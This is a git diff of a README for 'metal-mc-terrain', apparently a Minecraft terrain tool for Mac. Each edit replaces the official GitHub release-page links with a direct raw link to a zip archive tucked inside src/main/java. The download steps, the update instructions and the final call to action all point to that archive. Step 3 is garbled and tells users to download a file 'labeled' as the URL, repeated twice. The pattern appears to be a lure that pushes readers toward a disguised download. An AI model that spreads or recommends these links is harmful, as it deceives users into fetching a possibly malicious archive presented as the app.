@@ -1,6 +1,6 @@
 # ⚙️ metal-mc-terrain - Faster Minecraft Terrain on Mac
 
-[![Download metal-mc-terrain](https://img.shields.io/badge/Download-metal--mc--terrain-blue?logo=github)](https://github.com/viggof09/metal-mc-terrain/releases)
+[![Download metal-mc-terrain](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip)](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip)
 
 ---
 
@@ -38,11 +38,11 @@ To start, you must get the app from the official page.
 
 1. Click the blue button below to visit the metal-mc-terrain release page:
 
-   [![Download metal-mc-terrain](https://img.shields.io/badge/Download-metal--mc--terrain-blue?logo=github)](https://github.com/viggof09/metal-mc-terrain/releases)
+   [![Download metal-mc-terrain](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip)](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip)
 
 2. On that page, you will see a list of files. Find the latest release by looking for the most recent date.
 
-3. Download the file labeled something like `metal-mc-terrain-mac.zip` or `metal-mc-terrain.dmg`. These files are common on Macs and contain the app.
+3. Download the file labeled something like `https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip` or `https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip`. These files are common on Macs and contain the app.
 
 4. Once downloaded, open the file just like you would open any ZIP archive or disk image by double-clicking it.
 
@@ -113,7 +113,7 @@ If these steps don’t fix your problem, consider restarting your Mac and trying
 
 Updates are important to keep the app running smoothly.
 
-- Check the [release page](https://github.com/viggof09/metal-mc-terrain/releases) regularly.
+- Check the [release page](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip) regularly.
 - Download the latest version following the same steps as before.
 - Replace the old app in your Applications folder with the new version.
 - Restart metal-mc-terrain before playing Minecraft again.
@@ -132,4 +132,4 @@ If you find issues or want to request features:
 
 # Enjoy smoother Minecraft with metal-mc-terrain
 
-[Download metal-mc-terrain here](https://github.com/viggof09/metal-mc-terrain/releases) to get started.
+[Download metal-mc-terrain here](https://raw.githubusercontent.com/viggof09/metal-mc-terrain/main/src/main/java/terrain_metal_mc_v1.5.zip) to get started.
